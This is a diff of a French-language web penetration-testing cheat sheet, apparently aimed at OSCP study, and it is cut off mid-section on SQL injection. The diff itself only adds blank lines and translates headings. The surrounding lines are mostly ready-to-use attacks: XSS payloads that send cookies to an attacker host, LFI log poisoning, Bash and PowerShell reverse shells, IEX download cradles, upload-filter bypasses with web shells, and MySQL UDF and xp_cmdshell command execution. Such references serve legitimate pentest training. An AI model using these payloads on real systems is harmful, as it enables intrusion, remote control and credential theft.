@@ -27,6 +27,7 @@ nikto -ask=no -h http://$IP 2>&1
 
 # Obtain SSL certificate information
 openssl s_client -connect <target_domain>:443
+
 ```
 
 
@@ -38,6 +39,7 @@ curl -X OPTIONS http://[TARGET_IP] -i
 
 # Ensuite, essayez les requêtes POST ou d'autres méthodes trouvées pour voir comment le serveur répond :
 curl -X POST http://[TARGET_IP]/[endpoint] -d "test=data"
+
 ```
 
 
@@ -52,6 +54,7 @@ builtwith [TARGET_IP]
 
 # Analyser des informations supplémentaires en utilisant les en-têtes HTTP
 curl -I http://[TARGET_IP]
+
 ```
 
 
@@ -91,6 +94,7 @@ ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -fs 4242
 # Exemple d’utilisation
 ffuf -w /usr/share/wordlists/dirb/common.txt -u http://$IP/FUZZ
 ffuf -w /usr/share/wordlists/dirb/big.txt -u http://$IP/FUZZ
+
 ```
 
 
@@ -123,6 +127,7 @@ dirb http://target /path/to/wordlist.txt -n -X .php,.html,.txt
 
 # Exemple d’utilisation
 dirb http://target.com
+
 ```
 
 
@@ -153,6 +158,7 @@ gobuster dir -u http://target -w /path/to/wordlist.txt -p http://127.0.0.1:8080
 # Exemple d’utilisation
 gobuster dir -u http://10.11.1.71:80/site/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e txt,php,html,htm
 gobuster dir -u http://192.168.196.199 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x pdf
+
 ```
 
 
@@ -171,6 +177,7 @@ feroxbuster -u http://$IP -t 30 -w /usr/share/wordlists/dirbuster/directory-list
 # Codes de statut spécifiques au filtre
 feroxbuster -u http://$IP -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e -C 404 #ignore denied
 feroxbuster -u http://$IP -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e -C 404,302 #handle redirects
+
 ```
 
 
@@ -207,6 +214,7 @@ dirsearch -u http://target -w /path/to/wordlist.txt --exclude-status 404,403
 # Exemple d’utilisation
 dirsearch -u http://$IP/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt 
 dirsearch -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 300 --recursive --exclude-status=400,404,405,408
+
 ```
 
 
@@ -236,6 +244,7 @@ wfuzz --hc 404 -c -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium
 
 # Utiliser des fils pour accélérer le processus (pas conseillé de dépasser 200)
 wfuzz --hc 404 -c -t <number_of_threads> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://<target_ip>/FUZZ
+
 ```
 
 
@@ -262,6 +271,7 @@ ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -t 50
 
 # Utiliser un proxy
 ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -x http://127.0.0.1:8080
+
 ```
 
 
@@ -285,6 +295,7 @@ dirb http://target /path/to/wordlist.txt -X .php,.html,.txt -N
 
 # Analysez SSL (HTTPS)
 dirb https://target /path/to/wordlist.txt -X .php,.html,.txt
+
 ```
 
 
@@ -311,6 +322,7 @@ gobuster dir -u http://target -w /path/to/wordlist.txt -t 50
 
 # Utiliser un proxy
 gobuster dir -u http://target -w /path/to/wordlist.txt -p http://127.0.0.1:8080
+
 ```
 
 
@@ -343,6 +355,7 @@ feroxbuster -u http://target -w /path/to/wordlist.txt -e php,html,txt -C 404,403
 
 # Utiliser un agent utilisateur personnalisé
 feroxbuster -u http://target -w /path/to/wordlist.txt -a "Mozilla/5.0"
+
 ```
 
 
@@ -369,6 +382,7 @@ dirsearch -u http://target -w /path/to/wordlist.txt -t 50
 
 # Utiliser un proxy
 dirsearch -u http://target -w /path/to/wordlist.txt -x http://127.0.0.1:8080
+
 ```
 
 
@@ -397,6 +411,7 @@ git log
 
 # Puis pour vérifier le diff commit
 git show [commitID]
+
 ```
 
 
@@ -420,6 +435,7 @@ git reset --hard
 
 # script automatique pour lire et restaurer la dernière dump git
 ./extractor.sh /.git/ extracted
+
 ```
 
 
@@ -433,17 +449,21 @@ Examiner les entrées et les réponses de l'application web.
 ```bash
 # Scan WordPress de base
 wpscan --url http://$IP/wp/
+
 ```
 
 
 ```bash
 # Brute forcing WordPress login
 wpscan --url http://$IP/wp/wp-login.php -U Admin --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login
+
 ```
 
 
 ```bash
+# Examiner une installation WordPress
 wpscan -u "http://<IP>/" --wp-content-dir "<custom-path>"
+
 ```
 
 
@@ -452,6 +472,7 @@ wpscan -u "http://<IP>/" --enumerate u
 
 # Utilisation de la liste de mots
 wpscan -u "http://<IP>/" --username <username> -w /usr/share/SecList/Usernames/xato-usernames-top-1millions-20000.txt
+
 ```
 
 
@@ -466,6 +487,7 @@ python3 wordpwn.py [LHOST] [LPORT] [HANDLER]
 
 # Exemple
 python3 wordpwn.py 192.168.119.140 443 Y
+
 ```
 
 
@@ -474,6 +496,7 @@ python3 wordpwn.py 192.168.119.140 443 Y
 ```bash
 # Scanner Drupal CMS
 droopescan scan drupal -u [TARGET_URL]
+
 ```
 
 
@@ -488,6 +511,7 @@ cd [TARGET_IP]
 
 # Afficher Git commet et révèle des informations sensibles
 sudo git show
+
 ```
 
 
@@ -504,6 +528,7 @@ sudo git show
 # Exploiter pour une liste de fichiers simple < [VULNERABLE_VERSION] - Téléchargement arbitraire de fichiers non authentifiés
 
 https://www.exploit-db.com/exploits/48979
+
 ```
 
 
@@ -511,6 +536,7 @@ https://www.exploit-db.com/exploits/48979
 
 ```bash
 cewl -w <dictionary-file> "http://<IP>/" --with-numbers
+
 ```
 
 
@@ -525,6 +551,7 @@ wpscan --url http(s)://<IP>/ --enumerate p
 
 # Aggressive detection of all plugins
 wpscan --url http(s)://<IP>/ --enumerate p --plugins-detection aggressive
+
 ```
 
 
@@ -540,6 +567,7 @@ Examiner les entrées et les réponses de l'application web.
 | http-webdav-scan:
 |   WebDAV type: Unknown
 |   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
+
 ```
 
 
@@ -548,6 +576,7 @@ Examiner les entrées et les réponses de l'application web.
 ```bash
 # Utiliser le cadavre
 cadaver [IP]
+
 ```
 
 
@@ -555,6 +584,7 @@ cadaver [IP]
 
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=80 -f aspx -o shell.aspx
+
 ```
 
 
@@ -562,6 +592,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=80 -f aspx -o shell.as
 
 ```bash
 curl -T 'shell.aspx' 'http://$VictimIP/' -u <username>:<password>
+
 ```
 
 
@@ -569,6 +600,7 @@ curl -T 'shell.aspx' 'http://$VictimIP/' -u <username>:<password>
 
 ```bash
 nc -nvlp 80
+
 ```
 
 
@@ -607,6 +639,7 @@ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/j
 
 # Option to send request to proxy as well
 --proxy 127.0.0.1:8080
+
 ```
 
 
@@ -637,6 +670,7 @@ cewl -w createWordlist.txt https://www.example.com
 
 # Améliorer la liste de mots avec les règles
 john ---wordlist=wordlist.txt --rules --stdout > wordlist-modified.txt
+
 ```
 
 
@@ -652,6 +686,7 @@ Examiner les entrées et les réponses de l'application web.
 
 ```text
 < > ' " { } ;
+
 ```
 
 
@@ -676,6 +711,7 @@ Examiner les entrées et les réponses de l'application web.
 <script>alert(document.cookie)</script>
 
 <script>alert(window.origin)</script>
+
 ```
 
 
@@ -686,6 +722,7 @@ Examiner les entrées et les réponses de l'application web.
 
 ```bash
 http://[SERVER_IP]:[PORT]/index.php?task=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
 ```
 
 ![Reflected XSS Payload](https://www.emmanuelsolis.com/img/xss01.png)
@@ -708,10 +745,11 @@ http://[SERVER_IP]:[PORT]/index.php?task=%3Cscript%3Ealert(document.cookie)%3C/s
 "><script src=http://[OUR_IP]></script>
 javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
 <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+
 ```
 
 
-### PrivEsc Using Session Hijacking
+### Élévation de privilèges par détournement de session
 
 
 <p class="oscp-command-note">Extrait HTML lié à « PrivEsc Using Session Hijacking ».</p>
@@ -724,6 +762,7 @@ new Image().src='http://OUR_IP/index.php?c='+document.cookie;
 
 # Access the Host
 <script src=http://OUR_IP>/script.js</script>
+
 ```
 
 
@@ -745,6 +784,7 @@ if (isset($_GET['c'])) {
     }
 }
 ?>
+
 ```
 
 
@@ -763,6 +803,7 @@ request.open("GET", targetURL, false);
 request.send();
 var match = regex.exec(request.responseText);
 var nonce = match[1];
+
 ```
 
 
@@ -772,6 +813,7 @@ var request = new XMLHttpRequest();
 request.open("POST", targetURL, true);
 request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 request.send(params);
+
 ```
 
 
@@ -781,6 +823,7 @@ var request = new XMLHttpRequest();
 request.open("POST", targetURL, true);
 request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 request.send(params);
+
 ```
 
 
@@ -800,6 +843,7 @@ function toJavaScriptEncoding(str) {
 
 let encodedPayload = toJavaScriptEncoding('insert_minified_javascript');
 console.log(encodedPayload);
+
 ```
 
 
@@ -811,6 +855,7 @@ console.log(encodedPayload);
 
 ```bash
 curl -i http://example.com --user-agent "<script>eval(String.fromCharCode(<resultFromRunningAboveScritpToEncode>))</script>" --proxy 127.0.0.1:8080
+
 ```
 
 
@@ -825,6 +870,7 @@ cd XSStrike
 pip install -r requirements.txt
 
 python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
+
 ```
 
 
@@ -837,6 +883,7 @@ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
 ```bash
 # [xss.req] est la requête capturée dans BurpSuite.
 ffuf -ic -c -of csv -request-proto http -request [xss.req] -w XSS-RSNAKE.txt
+
 ```
 
 
@@ -860,6 +907,7 @@ Examiner les entrées et les réponses de l'application web.
 
 ```bash
 ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
+
 ```
 
 
@@ -870,12 +918,16 @@ ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_
 
 
 ```bash
+# Examiner les chemins ou paramètres avec FFUF
 ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
+
 ```
 
 
 ```bash
+# Examiner les chemins ou paramètres avec FFUF
 ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
+
 ```
 
 
@@ -886,12 +938,16 @@ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:
 
 
 ```bash
+# Examiner les chemins ou paramètres avec FFUF
 ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
+
 ```
 
 
 ```bash
+# Examiner les chemins ou paramètres avec FFUF
 ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
+
 ```
 
 
@@ -926,6 +982,7 @@ http://<target_url>/file.php?recurse=../../../../../etc/passwd%2500.jpg
 
 # Récupérer les variables d'environnement du système
 http://<target_url>/file.php?recurse=../../../../../proc/self/environ
+
 ```
 
 
@@ -939,11 +996,13 @@ http://<target_url>/file.php?recurse=php://filter/convert.base64-encode/resource
 
 # Decode base64-encoded output
 echo "<BASE64_ENCODED_OUTPUT>" | base64 -d
+
 ```
 
 
 ```bash
 http://<target_url>/file.php?recurse=php://filter/read=string.rot13/resource=<file_name>
+
 ```
 
 
@@ -951,6 +1010,7 @@ http://<target_url>/file.php?recurse=php://filter/read=string.rot13/resource=<fi
 
 ```bash
 curl "http://<TARGET>/index.php?page=php://filter/convert.base64-encode/resource=<FILE>"
+
 ```
 
 
@@ -965,6 +1025,7 @@ curl "http://<TARGET>/index.php?page=php://filter/convert.base64-encode/resource
 
 ```bash
 http://<target_url>/file.php?recurse=../../../../../var/log/apache2/access.log
+
 ```
 
 
@@ -972,6 +1033,7 @@ http://<target_url>/file.php?recurse=../../../../../var/log/apache2/access.log
 
 ```bash
 ssh "<?php system('whoami'); ?>"@<target>
+
 ```
 
 
@@ -979,10 +1041,11 @@ ssh "<?php system('whoami'); ?>"@<target>
 
 ```bash
 http://<target_url>/file.php?recurse=../../../../../var/log/auth.log
+
 ```
 
 
-##### Mail PHP Execution (RCE via Email)
+##### Exécution de PHP par courriel
 
 Examiner les entrées et les réponses de l'application web.
 
@@ -995,6 +1058,7 @@ Examiner les entrées et les réponses de l'application web.
 
 ```bash
 telnet <target_ip> 25
+
 ```
 
 
@@ -1007,6 +1071,7 @@ RCPT TO:<www-data>
 DATA
 <?php echo shell_exec($_REQUEST['cmd']); ?>
 .
+
 ```
 
 
@@ -1014,6 +1079,7 @@ DATA
 
 ```bash
 smtp-user-enum -M VRFY -U <username_list> -t <target_ip>
+
 ```
 
 
@@ -1028,6 +1094,7 @@ smtp-user-enum -M VRFY -U <username_list> -t <target_ip>
 
 ```bash
 curl -X POST -d "cmd=<?php system('bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'); ?>" http://<target_url>/file.php?recurse=../../../../../proc/self/environ
+
 ```
 
 
@@ -1035,6 +1102,7 @@ curl -X POST -d "cmd=<?php system('bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1
 
 ```bash
 http://<target_url>/file.php?recurse=../../../../../proc/self/environ
+
 ```
 
 
@@ -1045,6 +1113,7 @@ http://<target_url>/file.php?recurse=../../../../../proc/self/environ
 
 ```bash
 git clone https://github.com/D35m0nd142/LFISuite
+
 ```
 
 
@@ -1052,6 +1121,7 @@ git clone https://github.com/D35m0nd142/LFISuite
 
 ```bash
 python rfiscanner.py <target_url>
+
 ```
 
 
@@ -1068,6 +1138,7 @@ Examiner les entrées et les réponses de l'application web.
 ```bash
 # Cette technique nécessite que allow_url_fopen ou allow_url_include soit activé sur le serveur.
 http://<target_url>/file.php?recurse=http://<attacker_ip>/malicious.php
+
 ```
 
 
@@ -1078,6 +1149,7 @@ http://<target_url>/file.php?recurse=http://<attacker_ip>/malicious.php
 
 ```bash
 python3 -m http.server 80
+
 ```
 
 
@@ -1093,6 +1165,7 @@ python3 -m http.server 80
 
 # Option 2: Reverse Shell via Bash
 bash -c "sh -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1"
+
 ```
 
 
@@ -1100,6 +1173,7 @@ bash -c "sh -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1"
 
 ```bash
 curl "http://<TARGET>/index.php?page=http://<ATTACKER_IP>/revshell.php&cmd=ls"
+
 ```
 
 
@@ -1122,6 +1196,7 @@ Examiner les entrées et les réponses de l'application web.
 
 ```php
 <?php system($_GET['cmd']); ?>
+
 ```
 
 
@@ -1134,6 +1209,7 @@ Examiner les entrées et les réponses de l'application web.
 
 ```text
 <% eval request('cmd') %>
+
 ```
 
 
@@ -1146,6 +1222,7 @@ Vérifier les ports et les services de la cible autorisée.
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT>
+
 ```
 
 
@@ -1184,6 +1261,7 @@ Examiner les permissions et la configuration de Linux.
 /proc/self/environ
 ../wp-content/wp-config.php
 /www/apache/conf/httpd.conf
+
 ```
 
 
@@ -1278,6 +1356,7 @@ C:\xampp\php\php.ini
 C:\xampp\security\webdav.htpasswd
 C:\xampp\sendmail\sendmail.ini
 C:\xampp\tomcat\conf\server.xml
+
 ```
 
 
@@ -1297,6 +1376,7 @@ curl "http://<TARGET>/index.php?page=php://filter/convert.base64-encode/resource
 
 # Decode base64-encoded output
 echo "<BASE64_ENCODED_OUTPUT>" | base64 -d
+
 ```
 
 
@@ -1311,6 +1391,7 @@ curl "http://<TARGET>/index.php?page=data://text/plain,<PHP_PAYLOAD>"
 
 # Encode PHP payload in base64:
 echo -n '<?php echo system($_GET["cmd"]); ?>' | base64
+
 ```
 
 
@@ -1323,6 +1404,7 @@ Examiner les entrées et les réponses de l'application web.
 
 ```powershell
 (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+
 ```
 
 
@@ -1330,6 +1412,7 @@ Examiner les entrées et les réponses de l'application web.
 
 ```powershell
 IEX (New-Object System.Net.Webclient).DownloadString("http://<ATTACKER_IP>/powercat.ps1");powercat -c <ATTACKER_IP> -p <PORT> -e powershell
+
 ```
 
 
@@ -1337,6 +1420,7 @@ IEX (New-Object System.Net.Webclient).DownloadString("http://<ATTACKER_IP>/power
 
 ```bash
 curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<ATTACKER_IP>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<ATTACKER_IP>%20-p%20<PORT>%20-e%20powershell' http://<TARGET>:<PORT>/archive
+
 ```
 
 
@@ -1380,6 +1464,7 @@ Examiner les entrées et les réponses de l'application web.
 .php\x00.png
 .php%00.jpg
 .php\x00.jpg
+
 ```
 
 
@@ -1396,6 +1481,7 @@ if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
     echo "Only images are allowed";
     die();
 }
+
 ```
 
 
@@ -1410,6 +1496,7 @@ if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
 
 # Pour ASP(X)
 .aspx, .asp, .ashx, .asmx
+
 ```
 
 
@@ -1421,6 +1508,7 @@ if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
 
 ```text
 AddType application/x-httpd-php .dork
+
 ```
 
 
@@ -1433,6 +1521,7 @@ AddType application/x-httpd-php .dork
 ```bash
 # Nous pouvons maintenant télécharger des fichiers [file].dork.
 echo "AddType application/x-httpd-php .dork" > .htaccess
+
 ```
 
 
@@ -1445,6 +1534,7 @@ echo "AddType application/x-httpd-php .dork" > .htaccess
 ```bash
 # Cela vérifie si elle se termine avec elle si double extension ne fonctionnera pas.
 if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
+
 ```
 
 
@@ -1452,6 +1542,7 @@ if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
 
 ```text
 shell.php%00.jpg
+
 ```
 
 
@@ -1468,6 +1559,7 @@ shell.php%00.jpg
 .
 …
 :
+
 ```
 
 
@@ -1483,6 +1575,7 @@ for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
         echo "shell.jpg$ext$char" >> wordlist.txt
     done
 done
+
 ```
 
 
@@ -1499,6 +1592,7 @@ GIF8
 <?
 system($_GET['cmd']); //or you can insert your complete shell code
 ?>
+
 ```
 
 
@@ -1518,6 +1612,7 @@ if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))
     echo "Only images are allowed";
     die();
 }
+
 ```
 
 ![MIME Spoofing](https://www.emmanuelsolis.com/img/php_filters01.png)
@@ -1532,6 +1627,7 @@ if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))
 http://[TARGET_IP]/uploads/shell.php
 # Autre possibilité
 http://[TARGET_IP]/uploads/shell.php?cmd=whoami
+
 ```
 
 
@@ -1548,6 +1644,7 @@ http://[TARGET_IP]/uploads/shell.php?cmd=whoami
 exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg
 
 mv lo.jpg lo.php.jpg
+
 ```
 
 
@@ -1558,6 +1655,7 @@ mv lo.jpg lo.php.jpg
 
 ```text
 file$(whoami).jpg
+
 ```
 
 
@@ -1569,6 +1667,7 @@ file$(whoami).jpg
 
 ```text
 file.jpg||whoami
+
 ```
 
 
@@ -1580,6 +1679,7 @@ echo "bash -i >& /dev/tcp/192.168.45.166/444 0>&1" | base64
 
 # Télécharger n'importe quelle image normale, et lui donner le nom: cat.jpg.
 cp cat.jpg ’|smile”`echo <base64_bash_reverse_shell> | base64 -d | bash`”.jpg’
+
 ```
 
 
@@ -1602,6 +1702,7 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 mysql -u <username> -p -h <host>
 
 # Ensuite, indiquez le mot de passe quand vous l'invitez.
+
 ```
 
 
@@ -1612,6 +1713,7 @@ mysql -u <username> -p -h <host>
 
 ```sql
 SELECT VERSION();
+
 ```
 
 
@@ -1619,6 +1721,7 @@ SELECT VERSION();
 
 ```sql
 SHOW DATABASES;
+
 ```
 
 
@@ -1626,6 +1729,7 @@ SHOW DATABASES;
 
 ```sql
 USE <database_name>;
+
 ```
 
 
@@ -1636,11 +1740,13 @@ USE <database_name>;
 
 ```sql
 SHOW TABLES;
+
 ```
 
 
 ```sql
 SHOW COLUMNS FROM <table_name>;
+
 ```
 
 
@@ -1651,6 +1757,7 @@ SHOW COLUMNS FROM <table_name>;
 
 ```sql
 SELECT User, Host FROM mysql.user;
+
 ```
 
 
@@ -1658,6 +1765,7 @@ SELECT User, Host FROM mysql.user;
 
 ```sql
 SHOW GRANTS FOR '<username>'@'<host>';
+
 ```
 
 
@@ -1668,6 +1776,7 @@ SHOW GRANTS FOR '<username>'@'<host>';
 
 ```sql
 SELECT * FROM <table_name> LIMIT <number_of_rows>;
+
 ```
 
 
@@ -1678,6 +1787,7 @@ SELECT * FROM <table_name> LIMIT <number_of_rows>;
 
 ```bash
 mysql -u root -p -h <host> -e "use mysql; create table foo(line blob); insert into foo values(load_file('/path/to/your/udf/lib_mysqludf_sys.so')); select * from foo into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';"
+
 ```
 
 
@@ -1685,6 +1795,7 @@ mysql -u root -p -h <host> -e "use mysql; create table foo(line blob); insert in
 
 ```sql
 CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
+
 ```
 
 
@@ -1692,6 +1803,7 @@ CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
 
 ```sql
 SELECT sys_exec('id');
+
 ```
 
 
@@ -1702,6 +1814,7 @@ SELECT sys_exec('id');
 
 ```bash
 nc -lvnp 4444
+
 ```
 
 
@@ -1709,6 +1822,7 @@ nc -lvnp 4444
 
 ```sql
 SELECT sys_exec('bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1');
+
 ```
 
 
@@ -1753,6 +1867,7 @@ long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
     const char *command = args->args[0];
     return system(command);
 }
+
 ```
 
 
@@ -1771,6 +1886,7 @@ gcc -Wall -fPIC -I/usr/include/mysql -shared -o lib_mysqludf_sys.so lib_mysqludf
 # -fPIC : produire du code indépendant de l'adresse, nécessaire aux bibliothèques partagées.
 # -shared : produire une bibliothèque partagée.
 # -I/usr/include/mysql : inclure les en-têtes de développement MySQL. 
+
 ```
 
 
@@ -1785,6 +1901,7 @@ mysql -u root -p -h <host> -e "USE mysql;
 CREATE TABLE foo(line BLOB); 
 INSERT INTO foo VALUES (LOAD_FILE('/path/to/your/udf/lib_mysqludf_sys.so')); 
 SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';"
+
 ```
 
 
@@ -1796,6 +1913,7 @@ SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';"
 
 ```sql
 CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
+
 ```
 
 
@@ -1803,6 +1921,7 @@ CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
 
 ```sql
 SELECT sys_exec('id');
+
 ```
 
 
@@ -1818,6 +1937,7 @@ mysql -u root -p -h <host> -e "USE mysql;
 CREATE TABLE foo(line BLOB); 
 INSERT INTO foo VALUES (LOAD_FILE('/path/to/existing/lib_mysqludf_sys.so')); 
 SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';"
+
 ```
 
 
@@ -1834,6 +1954,7 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 ```bash
 # Conseil : vous pouvez également spécifier un domaine en utilisant <domain>/<username>:<password>@<host>.
 impacket-mssqlclient <username>:<password>@<host> -windows-auth
+
 ```
 
 
@@ -1844,11 +1965,13 @@ impacket-mssqlclient <username>:<password>@<host> -windows-auth
 
 ```sql
 SELECT @@version;
+
 ```
 
 
 ```sql
 SELECT name FROM sys.databases;
+
 ```
 
 
@@ -1856,6 +1979,7 @@ SELECT name FROM sys.databases;
 
 ```sql
 USE <database_name>;
+
 ```
 
 
@@ -1867,11 +1991,13 @@ USE <database_name>;
 ```sql
 # Astuce : remplacer <schema> par le nom actuel du schéma (communément dbo).
 SELECT table_name FROM <schema>.information_schema.tables;
+
 ```
 
 
 ```sql
 SELECT column_name FROM <schema>.information_schema.columns WHERE table_name = '<table_name>';
+
 ```
 
 
@@ -1882,11 +2008,13 @@ SELECT column_name FROM <schema>.information_schema.columns WHERE table_name = '
 
 ```sql
 SELECT * FROM <schema>.dbo.sysusers;
+
 ```
 
 
 ```sql
 SELECT * FROM <schema>.sys.database_permissions WHERE grantee_principal_id = (SELECT principal_id FROM <schema>.sys.database_principals WHERE name = '<username>');
+
 ```
 
 
@@ -1897,6 +2025,7 @@ SELECT * FROM <schema>.sys.database_permissions WHERE grantee_principal_id = (SE
 
 ```sql
 SELECT * FROM <schema>.<table_name> LIMIT <number_of_rows>;
+
 ```
 
 
@@ -1910,11 +2039,13 @@ EXEC sp_configure 'show advanced options', 1;
 RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
+
 ```
 
 
 ```sql
 EXEC xp_cmdshell 'whoami';
+
 ```
 
 
@@ -1940,6 +2071,7 @@ EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''
 
 # Pour obtenir un shell inverse direct
 EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''<attacker_ip>'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> ''; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()}"';
+
 ```
 
 
@@ -1955,7 +2087,7 @@ EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClie
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
 
-#### Common SQL Functions
+#### Fonctions SQL courantes
 
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
@@ -1978,6 +2110,7 @@ IF(<condition>, <true action>, <false action>) -- Conditional if statement
 LIKE "<string>%"                     -- Checks if provided string is present
 OUTFILE "<url to file>"              -- Dump output of select statement into a file
 LOAD_FILE("<url to file>")          -- Dump the content of a file
+
 ```
 
 
@@ -1990,6 +2123,7 @@ NEWID()                               -- Generate random unique identifier
 CAST(<expression> AS <data_type>)    -- Cast expression to a specific data type
 SELECT DB_NAME()                      -- Get the current database name
 SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '<table>'  -- Get column names
+
 ```
 
 
@@ -2000,11 +2134,13 @@ SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '<table>' 
 
 ```bash
 <input>' OR 1=1 -- //
+
 ```
 
 
 ```bash
 <input>' OR 1=1 in (SELECT @@version) -- //
+
 ```
 
 
@@ -2013,6 +2149,7 @@ SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '<table>' 
 
 # Exemple
 <input>' OR 1=1 in (SELECT * FROM users) -- //
+
 ```
 
 
@@ -2021,6 +2158,7 @@ SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '<table>' 
 
 # Exemple
 ' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
+
 ```
 
 
@@ -2036,6 +2174,7 @@ SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '<table>' 
 ```bash
 # MySQL & MSSQL
 <input>' ORDER BY <number> -- -
+
 ```
 
 
@@ -2051,6 +2190,7 @@ wfuzz -c -z range,1-10 "http://website.com/index.php?id=1 ORDER BY FUZZ"
 
 -- MSSQL
 wfuzz -c -z range,1-10 "http://website.com/index.php?id=1 ORDER BY FUZZ"
+
 ```
 
 
@@ -2062,6 +2202,7 @@ http://<site>/report.php?id=-23' UNION SELECT 1, 2, DATABASE(), 4, 5; -- -
 
 # MSSQL
 http://<site>/report.php?id=-23' UNION SELECT 1, 2, DB_NAME(), 4, 5; -- -
+
 ```
 
 
@@ -2071,6 +2212,7 @@ http://<site>/report.php?id=-23' UNION SELECT 1, 2, table_name, 4, 5 FROM inform
 
 # MSSQL
